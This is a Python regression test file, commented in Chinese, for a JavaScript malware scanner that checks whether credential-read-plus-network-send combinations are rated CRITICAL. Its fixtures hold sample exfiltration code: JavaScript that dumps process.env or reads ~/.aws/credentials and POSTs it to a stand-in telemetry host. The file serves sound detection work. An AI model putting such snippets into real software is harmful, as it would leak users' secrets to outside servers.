"""JS 组合判定回归测试。

存在原因：第三方实测发现同一行为在 .py 下是 49/D 阻断、在 .js 下是 100/100 A+。
根因是 JS 侧只做单行正则，看不到"凭证路径 + 读取 + 网络发送"这种组合。
本测试把这个行为钉住，防止再次回退成"换个后缀就换个结论"。
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from js_analyzer import scan_js_file, js_flags  # noqa: E402


def test_js_flags_exposes_read_sink_and_import(tmp_path):
    """跨文件组合靠 js_flags 的读/发行号与导入集合，任何一项缺失判定就失效。"""
    p = tmp_path / "send.js"
    p.write_text(
        "const https = require('https');\n"
        "const { contents } = require('./read');\n"
        "https.request({ hostname: 'telemetry.example.net' });\n",
        encoding="utf-8",
    )
    flags = js_flags(p)
    assert flags["sink"] == 3
    assert "read" in flags["imports"]


def _scan(tmp_path, name, code):
    p = tmp_path / name
    p.write_text(code, encoding="utf-8")
    return [(sev, cat, msg, ln) for sev, cat, msg, ln in scan_js_file(p)]


def _criticals(findings):
    return [f for f in findings if f[0] == "CRITICAL"]


def test_env_spread_plus_sink_is_critical(tmp_path):
    code = """const https = require('https');
const snapshot = { ...process.env };
const body = JSON.stringify(snapshot);
const req = https.request({ hostname: 'telemetry.example.net', path: '/c', method: 'POST' });
req.write(body);
req.end();
"""
    crit = _criticals(_scan(tmp_path, "a.js", code))
    assert crit, "整份 process.env 展开 + 网络发送必须判 CRITICAL"
    assert any("process.env" in c[2] for c in crit)


def test_literal_credential_path_plus_sink_is_critical(tmp_path):
    code = """const fs = require('fs');
const https = require('https');
const creds = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');
const req = https.request({ hostname: 'telemetry.example.net', method: 'POST' });
req.write(creds);
req.end();
"""
    crit = _criticals(_scan(tmp_path, "b.js", code))
    assert crit, "凭证路径 + 读取 + 发送必须判 CRITICAL"
    assert any("凭证" in c[2] for c in crit)


def test_credential_read_without_sink_stays_high(tmp_path):
    """只读不放：应当报 HIGH，不得升 CRITICAL——档位差一档，不能靠猜。"""
    code = """const fs = require('fs');
const token = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');
console.log(token.length);
"""
    findings = _scan(tmp_path, "c.js", code)
    assert not _criticals(findings), "没有网络 sink 时不得判 CRITICAL"
    assert any(f[0] == "HIGH" for f in findings)


def test_plain_network_call_is_not_critical(tmp_path):
    code = """const https = require('https');
const req = https.request({ hostname: 'api.example.com', path: '/v1/ping' });
req.end();
"""
    assert not _criticals(_scan(tmp_path, "d.js", code))


def test_comment_only_mentions_do_not_fire(tmp_path):
    """注释里讲规则不等于执行规则——扫描器扫自己时不能自命中。"""
    code = """// const creds = fs.readFileSync(process.env.HOME + '/.aws/credentials');
// const snapshot = { ...process.env };
module.exports = {};
"""
    assert not _criticals(_scan(tmp_path, "e.js", code))
